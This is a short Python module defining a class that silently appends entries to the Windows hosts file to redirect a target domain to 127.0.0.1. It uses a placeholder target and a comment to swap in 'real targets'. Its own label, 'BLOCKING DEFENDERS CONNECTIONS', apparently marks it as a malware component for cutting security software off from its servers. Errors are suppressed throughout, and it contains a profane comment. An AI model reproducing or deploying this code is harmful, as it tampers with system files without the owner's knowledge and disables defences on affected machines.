import os

__all__ = ["BLOCKNET"]

class BLOCKNET(object):
    def __init__(self):
        self.__inet = "facebook.com" #EXAMPLE - change with real targets
        #FUCK FACEBOOK
        self.__dr = r"C:\Windows\System32\drivers\etc\hosts"
        self.__ip = "127.0.0.1"
    def __str__(self):
        return "BLOCKING DEFENDERS CONNECTIONS - PROCESS"
    def __getstate__(self):
        raise TypeError("D.E.N.I.E.D")
    def __call__(self):
        return
    def __repr__(self):
        return BLOCKNET.__doc__
    def _CONTROL(self):
        if os.path.exists(self.__dr):
            return True
        else:
            return False
    def _MODIFY(self):
        try:
            if self._CONTROL():
                with open(self.__dr,"r+") as rf:
                    hst = rf.read()
                    try:
                        if self.__inet not in hst:
                            rf.write(self.__ip+" "+self.__inet+"\n")
                            print("[OK] BLOCKED")
                        else:
                            pass
                    except Exception as err:
                        # print(str(err))
                        pass
            else:
                print("FILE - ERROR [ACCESS DENIED]")
        except KeyboardInterrupt:
            raise UserWarning("CLOSED BY USER")
        except Exception as err:
            # print(str(err))
            pass